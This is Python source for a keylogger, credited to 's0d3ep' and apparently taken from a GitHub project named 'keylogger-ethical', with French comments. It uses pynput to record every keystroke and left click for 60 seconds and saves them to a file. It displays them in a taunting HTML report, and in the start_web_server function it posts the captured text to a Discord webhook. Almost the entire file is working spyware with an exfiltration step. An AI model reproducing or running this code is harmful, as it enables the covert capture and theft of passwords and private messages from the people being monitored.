# Keylogger open source - s0d3ep
# GitHub: https://github.com/waaashed/keylogger-ethical

from flask import Flask, render_template_string
import os
from pynput import keyboard, mouse
import time
import threading
import requests
import webbrowser

# Configuration
DOCUMENTS_PATH = os.path.join(os.path.expanduser('~'), 'Documents')
FILE_PATH = os.path.join(DOCUMENTS_PATH, "keylogger.txt")
RECORD_DURATION = 60 # Temps en secondes
WEBHOOK_URL = "VOTRE API DISCORD WEBHOOK"

app = Flask(__name__)

# HTML template with embedded CSS
template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger Report</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
            background-color: #000000;
            color: #00ff00;
            font-family: "Courier New", monospace;
            margin: 20px;
        }
        a {
            color: lime;
            text-decoration: none;
        }
        h1 {
            color: lime;
            font-size: 36px;
            font-weight: bold;
            text-align: center;
        }
        pre, code {
            color: lime;
            font-family: "Courier New", monospace;
            font-size: 14px;
            background-color: #000000;
            padding: 10px;
            white-space: pre-wrap;
            overflow-x: auto;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }
        p {
            color: #00ff00;
            font-size: 16px;
            line-height: 1.5;
            text-align: center;
            margin-top: 20px;
        }
        img {
            max-width: 100%;
            height: auto;
            margin-top: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
            display: block; /* Pour centrer le GIF */
            margin-left: auto;
            margin-right: auto;
        }
        .container {
            background-color: #000000;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }
        /* Crédit à l'auteur */
        .credit {
            color: #00ff00;
            font-size: 12px;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Keylogger Report</h1>
        <pre>{{ key_presses }}</pre>
        <p>{{ user_profile }}, n'oublie pas que la curiosité n'est pas toujours bien vue...<br></p>
        <img src="keylogger_s0d3ep/hackerman.gif" alt="GIF de Hackerman">
        <div class="credit"># Keylogger open source par s0d3ep - GitHub: <a href="https://github.com/waaashed/keylogger-ethical" target="_blank">https://github.com/waaashed/keylogger-ethical</a></div>
    </div>
</body>
</html>
"""

# Initialisation des variables
start_time = time.time()
key_presses = []
mouse_clicks = 0

# Fonction appelée lorsqu'une touche ou un clic de souris est pressé
def on_press(key):
    global mouse_clicks
    # Exclut les événements des touches "backspace", "espace" et "enter"
    if key in [keyboard.Key.backspace, 
               keyboard.Key.space, 
               keyboard.Key.enter, 
               keyboard.Key.caps_lock, 
               keyboard.Key.shift,
               keyboard.Key.shift_r, 
               keyboard.Key.alt, 
               keyboard.Key.alt_l, 
               keyboard.Key.ctrl, 
               keyboard.Key.tab, 
               keyboard.Key.ctrl_r, 
               keyboard.Key.ctrl_l, 
               keyboard.Key.alt_gr]:
        # Ajoute un espace dans la liste pour rendre plus lisible
        if key == keyboard.Key.space:
            key_presses.append(" ")
        return
    try:
        # Ajoute la touche à la liste
        key_presses.append(key.char)
    except AttributeError:
        # Si la touche n'est pas un caractère, ajoute la représentation de la touche
        key_presses.append(str(key))

# Fonction appelée lorsqu'un clic de souris est effectué
def on_click(x, y, button, pressed):
    global mouse_clicks
    if button == mouse.Button.left and pressed:
        # Ajoute un espace à chaque clic gauche pour éviter que les textes se suivent en cas de changement de page
        key_presses.append(" ")
        mouse_clicks += 1

# Fonction pour lancer le serveur web
def start_web_server():
    os.chdir(DOCUMENTS_PATH)

    # Utilisez l'application Flask pour obtenir le contexte d'application
    with app.app_context():
        # Rend le modèle à l'intérieur du contexte de l'application Flask
        rendered_html = render_template_string(template, key_presses="".join(key_presses), user_profile=user_profile)

        # Sauvegarde le HTML dans un fichier
        with open("keylogger_report.html", "w", encoding="utf-8") as html_file:
            html_file.write(rendered_html)

        # Ouvre le fichier HTML dans le navigateur après la création
        webbrowser.open('file://' + os.path.abspath("keylogger_report.html"))

        # Envoi des données au webhook Discord
        payload = {
            "content": "".join(key_presses),
            "username": "Keylogger Bot"
        }
        requests.post(WEBHOOK_URL, json=payload)

if __name__ == '__main__':
    # Démarre l'écoute des touches
    with keyboard.Listener(on_press=on_press) as key_listener:
        # Démarre l'écoute des clics de souris
        with mouse.Listener(on_click=on_click) as mouse_listener:
            # Enregistre pendant la durée spécifiée
            while time.time() - start_time < RECORD_DURATION:
                pass

    # Arrête l'écoute des touches et des clics de souris
    key_listener.stop()
    mouse_listener.stop()

    # Utilise os.path.basename() pour extraire le nom du répertoire utilisateur
    user_profile = os.path.basename(os.path.expanduser('~'))
    message = f""
    key_presses.append(message)

    # Enregistre les frappes dans le fichier texte
    with open(FILE_PATH, "w") as file:
        file.write("".join(key_presses))

    # Crée un thread pour le serveur web
    web_server_thread = threading.Thread(target=start_web_server)
    web_server_thread.start()

    print(f"Les frappes ont été enregistrées dans le répertoire Documents dans le fichier {FILE_PATH}")
